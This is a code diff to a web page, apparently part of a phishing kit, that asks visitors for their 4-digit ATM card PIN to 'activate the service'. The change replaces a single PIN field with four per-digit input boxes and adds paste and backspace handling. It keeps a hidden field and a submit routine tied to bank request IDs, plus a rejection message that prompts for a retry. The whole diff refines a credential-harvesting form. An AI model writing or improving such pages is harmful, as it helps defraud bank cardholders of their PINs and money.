@@ -103,47 +103,36 @@
     margin: 0 0 18px;
     text-align: center;
   }
-  .pin-display {
+  .pin-boxes {
     display: flex;
     justify-content: center;
-    gap: 12px;
+    gap: 14px;
     margin-bottom: 24px;
     direction: ltr;
   }
-  .pin-dot {
-    width: 16px;
-    height: 16px;
-    border-radius: 50%;
+  .pin-box {
+    width: 56px;
+    height: 64px;
     border: 2px solid var(--border);
-    transition: all 0.15s ease;
-  }
-  .pin-dot.filled {
-    background-color: var(--green);
-    border-color: var(--green);
-    transform: scale(1.1);
-  }
-  .pin-input-wrap {
-    display: flex;
-    justify-content: center;
-    margin: 0 auto 24px;
-    width: 100%;
-    max-width: 220px;
-  }
-  .pin-input {
-    width: 100%;
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 12px 14px;
-    font-size: 22px;
-    letter-spacing: 0.5em;
+    border-radius: 14px;
+    font-size: 26px;
+    font-weight: 700;
     text-align: center;
     color: var(--green);
-    background-color: #fff;
+    background: #fff;
+    transition: all 0.2s ease;
+    -webkit-text-security: disc;
+    caret-color: var(--green);
   }
-  .pin-input:focus {
+  .pin-box:focus {
     outline: none;
     border-color: var(--green);
-    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.08);
+    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.12), 0 4px 12px rgba(26, 107, 60, 0.08);
+    transform: scale(1.06);
+  }
+  .pin-box.filled {
+    border-color: var(--green);
+    background: rgba(26, 107, 60, 0.04);
   }
   .btn-submit {
     width: 100%;
@@ -227,16 +216,13 @@
     <h2>Confirm Card PIN</h2>
     <p class="desc">Please enter your 4-digit card PIN (ATM PIN) to complete the verification process and activate the service successfully.</p>
     
-    <div class="pin-display">
-      <div class="pin-dot" id="dot-0"></div>
-      <div class="pin-dot" id="dot-1"></div>
-      <div class="pin-dot" id="dot-2"></div>
-      <div class="pin-dot" id="dot-3"></div>
+    <div class="pin-boxes">
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 2" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 3" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 4" />
     </div>
-
-    <div class="pin-input-wrap">
-      <input class="pin-input" id="atmPinInput" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••" aria-label="ATM PIN" />
-    </div>
+    <input type="hidden" id="atmPinInput" />
 
     <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm &amp; Continue</button>
     <div class="error-msg" id="errorMsg">The PIN was rejected. Please verify the details and try again.</div>
@@ -265,6 +251,47 @@
     sessionStorage.setItem('safwa_order_id', String(requestId));
     sessionStorage.setItem('aman_bank_request_id', String(requestId));
 
+    var boxes = Array.prototype.slice.call(document.querySelectorAll('.pin-box'));
+    var hiddenPin = document.getElementById('atmPinInput');
+
+    function syncHidden() {
+      pin = boxes.map(function(b){ return b.value; }).join('');
+      if (hiddenPin) hiddenPin.value = pin;
+      boxes.forEach(function(b){ b.classList.toggle('filled', b.value.length > 0); });
+      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
+    }
+
+    boxes.forEach(function(box, idx) {
+      box.addEventListener('input', function() {
+        var val = box.value.replace(/\D/g, '');
+        box.value = val.slice(0, 1);
+        syncHidden();
+        if (val && idx < boxes.length - 1) boxes[idx + 1].focus();
+      });
+      box.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (!box.value && idx > 0) {
+            e.preventDefault();
+            boxes[idx - 1].value = '';
+            boxes[idx - 1].focus();
+            syncHidden();
+          }
+        }
+      });
+      box.addEventListener('paste', function(e) {
+        e.preventDefault();
+        var data = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+        for (var i = 0; i < boxes.length; i++) {
+          boxes[i].value = data[i] || '';
+        }
+        syncHidden();
+        var next = Math.min(data.length, boxes.length - 1);
+        boxes[next].focus();
+      });
+    });
+
+    if (boxes[0]) boxes[0].focus();
+
     function applyAtmRejectMessage() {
       var params = new URLSearchParams(window.location.search);
       if (params.get('error') !== 'atm') return;
@@ -276,68 +303,19 @@
       }
       var loadingOverlay = document.getElementById('loadingOverlay');
       if (loadingOverlay) loadingOverlay.style.display = 'none';
-      pin = '';
-      updateDots();
-      var atmPinInput = document.getElementById('atmPinInput');
-      if (atmPinInput) {
-        atmPinInput.value = '';
-        atmPinInput.focus();
-      }
-    }
-
-    var atmPinInput = document.getElementById('atmPinInput');
-
-    function updateDots() {
-      for (var i = 0; i < 4; i++) {
-        var dot = document.getElementById('dot-' + i);
-        if (i < pin.length) {
-          dot.classList.add('filled');
-        } else {
-          dot.classList.remove('filled');
-        }
-      }
-      if (atmPinInput) atmPinInput.value = pin;
-      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
-    }
-
-    function pressNum(num) {
-      if (pin.length < 4) {
-        pin += num;
-        updateDots();
-      }
+      boxes.forEach(function(b){ b.value = ''; b.classList.remove('filled'); });
+      syncHidden();
+      if (boxes[0]) boxes[0].focus();
     }
 
     function clearPin() {
-      pin = "";
-      updateDots();
-    }
-
-    function backspace() {
-      if (pin.length > 0) {
-        pin = pin.slice(0, -1);
-        updateDots();
-      }
-    }
-
-    if (atmPinInput) {
-      atmPinInput.addEventListener('input', function(){
-        pin = (atmPinInput.value || '').replace(/\D/g, '').slice(0, 4);
-        updateDots();
-      });
-
-      atmPinInput.addEventListener('keydown', function(event){
-        if (event.key === 'Backspace') {
-          event.preventDefault();
-          backspace();
-        }
-        if (event.key === 'Escape') {
-          event.preventDefault();
-          clearPin();
-        }
-      });
+      boxes.forEach(function(b){ b.value = ''; b.classList.remove('filled'); });
+      syncHidden();
+      if (boxes[0]) boxes[0].focus();
     }
 
     function submitPin() {
+      syncHidden();
       if (pin.length !== 4) return;
       if (!requestId) {
         alert("Sorry, request ID not found. Please start over.");
